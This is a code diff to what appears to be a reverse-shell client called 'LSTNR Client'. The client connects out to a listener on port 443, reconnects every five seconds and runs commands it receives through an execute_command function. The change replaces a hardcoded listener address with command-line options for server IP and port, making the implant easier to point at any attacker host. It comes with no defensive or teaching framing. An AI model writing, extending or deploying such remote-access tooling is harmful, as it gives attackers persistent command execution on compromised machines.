@@ -5,6 +5,15 @@ import platform
 import time
 import sys
 import base64
+import argparse
+
+def parse_arguments():
+    parser = argparse.ArgumentParser(description='LSTNR Client')
+    parser.add_argument('-s', '--server', type=str, default='127.0.0.1',
+                      help='Server IP address (default: 127.0.0.1)')
+    parser.add_argument('-p', '--port', type=int, default=443,
+                      help='Server port (default: 443)')
+    return parser.parse_args()
 
 def execute_command(command):
     try:
@@ -44,12 +53,12 @@ def get_os_info():
     except:
         return f"{platform.system()} {platform.release()}"
 
-def connect_to_server():
+def connect_to_server(server_ip, server_port):
     while True:
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.connect(('<LSTNR_IP>', 443))
-            print("[+] Connected to server")
+            sock.connect((server_ip, server_port))
+            print(f"[+] Connected to {server_ip}:{server_port}")
 
             # Send initial empty data
             sock.send(b"\n")
@@ -103,4 +112,5 @@ def connect_to_server():
         time.sleep(5)
 
 if __name__ == "__main__":
-    connect_to_server() 
+    args = parse_arguments()
+    connect_to_server(args.server, args.port) 
